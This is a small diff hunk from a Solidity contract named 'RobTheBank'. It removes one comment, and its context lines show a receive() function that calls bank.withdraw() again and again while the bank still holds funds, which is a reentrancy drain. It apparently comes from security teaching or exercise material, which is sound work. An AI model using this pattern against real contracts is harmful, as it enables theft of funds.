@@ -31,7 +31,6 @@ contract RobTheBank {
         bank.withdraw();
     }
 
-    // Called whenever the bank sends us ETH.
     receive() external payable {
         if (address(bank).balance >= d) {
             bank.withdraw();
